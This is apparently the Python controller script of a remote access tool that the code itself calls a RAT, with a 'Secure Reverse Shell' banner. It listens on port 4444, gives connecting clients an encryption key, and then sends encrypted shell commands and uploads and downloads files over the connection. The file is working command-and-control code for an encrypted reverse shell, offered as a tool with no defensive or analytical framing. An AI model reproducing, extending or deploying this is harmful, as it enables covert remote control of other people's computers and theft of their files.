import socket
import os
import time
import threading
from crypto_utils import encrypt_message, decrypt_message, generate_key

HOME_DIR = os.path.expanduser('~')

if os.name == 'nt':
    KEY_PATH = os.path.join(HOME_DIR, 'Documents', 'secret.key')
else:
    KEY_PATH = os.path.join(HOME_DIR, '.secret.key')

def generate_new_key():
    key = generate_key()
    with open(KEY_PATH, 'wb') as f:
        f.write(key)

try:
    with open(KEY_PATH, 'rb') as f:
        KEY = f.read().strip()
except FileNotFoundError:
    generate_new_key()
    with open(KEY_PATH, 'rb') as f:
        KEY = f.read().strip()

def send_key(conn, key):
    conn.send(key)

def recv_response(key, sock):
    try:
        size_header = sock.recv(64).decode('utf-8').strip()
        if not size_header:
            return None 
        data_size = int(size_header)

        sock.send(b'OK_SIZE')
    except (ValueError, socket.error):
        print('[!] Data transmission protocol error')
        return None

    data = b''
    bytes_received = 0 
    while bytes_received < data_size:
        chunk = sock.recv(min(4096, data_size - bytes_received))
        if not chunk:
            break
        data += chunk
        bytes_received += len(chunk)
    
    return decrypt_message(key, data)

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('0.0.0.0', 4444))
server.listen(2)
server.settimeout(60)
print('''
 ____________________________________________________________________________________________________________

|.d88b.                                818b.                                         .d88b. 8           8 8  |
|YPwww. .d88b .d8b 8   8 8d8b .d88b    8  .8 .d88b Yb  dP .d88b 8d8b d88b .d88b      YPwww. 8d8b. .d88b 8 8  |
|    d8 8.dP' 8    8b d8 8P   8.dP'    8wwK' 8.dP'  YbdP  8.dP' 8P   `Lb. 8.dP' wwww     d8 8P Y8 8.dP' 8 8  |
|`Y88P' `Y88P `Y8P `Y8P8 8    `Y88P    8  Yb `Y88P   YP   `Y88P 8    Y88P `Y88P      `Y88P' 8   8 `Y88P 8 8  |
|____________________________________________________________________________________________________________|
   | [Version 1.0] |                                                                                     
''')
time.sleep(1)
print(r'[*] Up to-date github link: https://github.com')
stop_loading = False

def show_dots():
    i = 0
    while not stop_loading:
        print(f"[*] Wait connection{'.' * (i % 4):<3}", end="\r")
        i += 1
        time.sleep(0.4)
    print(" " * 30, end="\r")

dot_thread = threading.Thread(target=show_dots, daemon=True)
dot_thread.start()

try:
    conn, addr = server.accept()
    print(f'[+] Connection by {addr}')

    stop_loading = True
    dot_thread.join()

    raw = conn.recv(1024)

    if raw == b'REQUEST_KEY':
        send_key(conn, KEY)
        ack = conn.recv(1024)
        if ack == b'KEY_RECEIVED':
            print('[+] Key sent to client')
            
        conn.close()
        conn, addr = server.accept()
        print(f'[+] Connection by {addr}')
        raw = conn.recv(1024)
        if raw == b'HELLO':
            print('[+] Client ready')
    elif raw == b'HELLO':
        print('[+] Client ready')
    else:
        print('[!] Unknown handshake')
        conn.close()
        server.close()
        input('[*] Press Enter to exit...')
        exit()

    while True:
        cmd = input('Command~$ ')
        if not cmd.strip():
            continue  

        encrypted_cmd = encrypt_message(KEY, cmd.encode('utf-8'))
        conn.send(encrypted_cmd)

        if cmd.lower() == 'restart' or cmd.lower() == 'res':
            output = recv_response(KEY, conn)
            print(output)
            conn.close()
            
            stop_loading = False
            dot_thread = threading.Thread(target=show_dots, daemon=True)
            dot_thread.start()
            
            try:
                conn, addr = server.accept()
                stop_loading = True
                dot_thread.join()
                print(f'\n[+] Client reconnected from {addr}')
                raw = conn.recv(1024)
                if raw == b'HELLO':
                    print('[+] Client ready')
            except socket.timeout:
                print("\n[!] Reconnection timeout expired")
                stop_loading = True
                dot_thread.join()
                break
            continue

        if cmd.lower() == 'exit':
            e = input('[*] Exit now? It will close connection and kill RAT on client site. [Y/N]: ')
            if e.lower() == 'y':
                print('[*] Exiting')
                break
            print('[-] Abort')
            continue

        if cmd.lower().startswith('upload '):
            local_path = input('[*] Enter full local path of file to upload: ').strip()
            if os.path.exists(local_path) and os.path.isfile(local_path):
                try:
                    with open(local_path, 'rb') as f:
                        file_data = f.read()
                    encrypted_file = encrypt_message(KEY, file_data)
                    file_len = len(encrypted_file)
                    conn.send(f"{file_len:<64}".encode('utf-8'))
                    
                    ack = conn.recv(1024)
                    if ack == b"OK_SIZE":
                        conn.sendall(encrypted_file)
                except Exception as e:
                    print(f"[!] Local error reading file: {str(e)}")
                    continue
            else:
                print("[!] Local file not found. Aborting upload.")
                continue

        output = recv_response(KEY, conn)
        
        if output is None:
            print('[!] Сlient terminated connection')
            break

        if cmd.lower().startswith('download ') and not output.startswith(b'[!]'):
            save_path = input('[*] Enter local path to save downloaded file: ').strip()
            try:
                with open(save_path, 'wb') as f:
                    f.write(output)
                print(f"[+] File saved to {save_path}")
            except Exception as e:
                print(f"[!] Error saving file locally: {str(e)}")
        else:
            print(output.decode('utf-8', errors='ignore'))

except socket.timeout:
    print("[!] Can't connect to client, please try again")
    stop_loading = True
    try:
        dot_thread.join()
    except:
        pass
    
finally:
    print('[*] Connection closed')
    try:
        server.close()
    except:
        pass
    input()
